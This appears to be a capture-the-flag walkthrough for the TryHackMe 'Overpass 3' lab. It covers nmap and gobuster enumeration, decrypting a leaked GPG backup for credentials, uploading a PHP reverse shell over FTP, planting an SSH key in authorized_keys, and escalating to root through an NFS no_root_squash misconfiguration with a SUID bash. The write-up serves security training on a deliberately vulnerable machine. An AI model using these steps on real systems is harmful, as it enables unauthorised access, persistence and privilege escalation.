# [Overpass 3 - Hosting [Medium]](https://tryhackme.com/room/overpass3hosting)

# Enum

## nmap

```
>>> nmap -sC -sV 10.10.205.247
Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-26 15:40 CET
Nmap scan report for 10.10.205.247
Host is up (0.054s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
|_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: Overpass Hosting
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.12 seconds
```
# port 80

## gobuster

```
>>> gobuster  -u http://10.10.205.247/  -w ~/wordlists/SecLists/Discovery/Web-Content/common.txt 

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.205.247/
[+] Threads      : 10
[+] Wordlist     : /home/nk0/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2024/02/26 15:41:38 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/backups (Status: 301)
/cgi-bin/ (Status: 403)
/index.html (Status: 200)
=====================================================
2024/02/26 15:41:55 Finished
=====================================================
```

looking at `IP/backups` we can find a zip file:

![alt text](https://i.imgur.com/gSIznc7.png)


On the zip file we can see two files:

![alt text](https://i.imgur.com/a4NpM01.png)

A `CustomerDetails.xlsx.gpg` and a `priv.key` wich look like a ssh key

Let's try to decipher the gpg file:
```
>>> gpg CustomerDetails.xlsx.gpg 
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
gpg: encrypted with RSA key, ID 9E86A1C63FB96335
gpg: decryption failed: No secret key
```
Let's use the key then:
```
>>> gpg --import priv.key CustomerDetails.xlsx.gpg
gpg: key C9AE71AB3180BC08: "Paradox <paradox@overpass.thm>" not changed
gpg: key C9AE71AB3180BC08: secret key imported
gpg: Total number processed: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:  secret keys unchanged: 1
```

![alt text](https://i.imgur.com/Najv4lL.png)

The xlxs file seems to contain users credentials and credit cards informations.

# initial access

## ftp

let's first try to log as anonymous:
```
>>> ftp 10.10.205.247         
Connected to 10.10.205.247.
220 (vsFTPd 3.0.3)
Name (10.10.205.247:nk0): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
```
unfortunatly it don't works. Let's try to log as a user then:
```
>>> ftp 10.10.205.247
Connected to 10.10.205.247.
220 (vsFTPd 3.0.3)
Name (10.10.205.247:nk0): paradox
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
it works, unfortunatly there isn't interesting file on the ftp, however we can upload files.
Let's upload a [reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php):
```
ftp> put revshell.php 
local: revshell.php remote: revshell.php
229 Entering Extended Passive Mode (|||40984|)
150 Ok to send data.
100% |********************************************************************************************************************************|  5492       28.31 MiB/s    00:00 ETA
226 Transfer complete.
5492 bytes sent in 00:00 (87.30 KiB/s)
ftp> 
```

Now we just have to go to: `http://IP/revshell.php`,
and boom we are in !

# PrivEsc

First let's log as paradox:

```
$ su paradox
Password:
$ id
uid=1001(paradox) gid=1001(paradox) groups=1001(paradox)
```

Let's add a ssh key to stabilize our shell:

```
>>> ssh-keygen -f paradox
>>> cat paradox.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9DdgF6i0qWDVI7T/Jf7e7I7f6bkwzPzIn+qC7LIwd14Fnfkdi2ocBIpgpUvsTGKq7FMSDMNiIUXCnGrneSYokL/MnVhL5R66laKMoU77HXzownKN/IT/ER4i+hvjUCbcJz5dSabebkK2UBMZG979Vk2vsqWF4CU64QR+s1xDu0cE2K0zwkABwvhJsAPepHL5dfDasdtejWTGVkgySQxz/vPqnSJVHkw5vY2IxMPSfHraBD9YN8GxTSkH7uCnClAgJTqRtgBzF0h4d6eJoQ0TBNJAcJyujhGUYqVhUe7NW7QZcTAVJ29pW6pTSQKB061f878+CC8bKF93SODRm1z/oI3idmJTBnx/PYx6//qJLN4YMoIuehDEVcijIGI/HA3hSh6BsLUW/PwglFTxPgE0DoR13BzhG4p+Azd5S8S5CgLhP14ZG49qWRBkijHBMh5kBxhF/SfRIzPonHJE3xB/cZFQZo10+ZLTV3Sl/kOM+tKB6Dol5zKNkOouWZKdvJq0= nk0@TUF
$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9DdgF6i0qWDVI7T/Jf7e7I7f6bkwzPzIn+qC7LIwd14Fnfkdi2ocBIpgpUvsTGKq7FMSDMNiIUXCnGrneSYokL/MnVhL5R66laKMoU77HXzownKN/IT/ER4i+hvjUCbcJz5dSabebkK2UBMZG979Vk2vsqWF4CU64QR+s1xDu0cE2K0zwkABwvhJsAPepHL5dfDasdtejWTGVkgySQxz/vPqnSJVHkw5vY2IxMPSfHraBD9YN8GxTSkH7uCnClAgJTqRtgBzF0h4d6eJoQ0TBNJAcJyujhGUYqVhUe7NW7QZcTAVJ29pW6pTSQKB061f878+CC8bKF93SODRm1z/oI3idmJTBnx/PYx6//qJLN4YMoIuehDEVcijIGI/HA3hSh6BsLUW/PwglFTxPgE0DoR13BzhG4p+Azd5S8S5CgLhP14ZG49qWRBkijHBMh5kBxhF/SfRIzPonHJE3xB/cZFQZo10+ZLTV3Sl/kOM+tKB6Dol5zKNkOouWZKdvJq0= nk0@TUF
" >> /home/paradox/.ssh/authorized_keys
>>> chmod 400 paradox 
>>> ssh -i paradox paradox@10.10.205.247
Last login: Mon Feb 26 15:19:55 2024
[paradox@localhost ~]$ 
```

Let's run [linpeas.sh](https://linpeas.sh/) on the machine to find vulnerabilties we can exploit:
```
[paradox@localhost ~]$ vi linpeas.sh
[paradox@localhost ~]$ sh linpeas.sh 
---
╔══════════╣ Analyzing NFS Exports Files (limit 70)
Connected NFS Mounts: 
nfsd /proc/fs/nfsd nfsd rw,relatime 0 0
sunrpc /var/lib/nfs/rpc_pipefs rpc_pipefs rw,relatime 0 0
-rw-r--r--. 1 root root 54 18 nov.   2020 /etc/exports
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
---
```
Let's exploit the [NFS no_root_squash](ege-escalation/nfs-no_root_squash-misconfiguration-pe)

```
[paradox@localhost ~]$ rpcinfo -p
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100024    1   udp  46240  status
    100024    1   tcp  38629  status
    100005    1   udp  20048  mountd
    100005    1   tcp  20048  mountd
    100005    2   udp  20048  mountd
    100005    2   tcp  20048  mountd
    100005    3   udp  20048  mountd
    100005    3   tcp  20048  mountd
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100021    1   udp  44017  nlockmgr
    100021    3   udp  44017  nlockmgr
    100021    4   udp  44017  nlockmgr
    100021    1   tcp  36403  nlockmgr
    100021    3   tcp  36403  nlockmgr
    100021    4   tcp  36403  nlockmgr

>>> ssh paradox@10.10.205.247 -i paradox -L 2049:localhost:2049
>>> mkdir /tmp/nfs
>>> sudo mount -v -t nfs localhost:/ /tmp/nfs                  
mount.nfs: timeout set for Mon Feb 26 17:01:56 2024
mount.nfs: trying text-based options 'vers=4.2,addr=127.0.0.1,clientaddr=127.0.0.1'
>>> cd /tmp/nfs
>>> ls -a
.  .. .bash_history  .bash_logout  .bash_profile  .bashrc  .ssh  user.flag
``` 
Let's add a vulnerable suid file and connect as James:
```
>>> cp /bin/bash .
>>> chmod u+s bash
>>> ls .ssh/     
authorized_keys  id_rsa  id_rsa.pub
>>> chmod 400 .ssh/id_rsa
>>> ssh -i .ssh/id_rsa james@10.10.205.247      
Last login: Wed Nov 18 18:26:00 2020 from 192.168.170.145
[james@localhost ~]$ ./bash -p  
bash-5.1# id
uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) Gruppen=0(root),1000(james)
```
We are now root :)
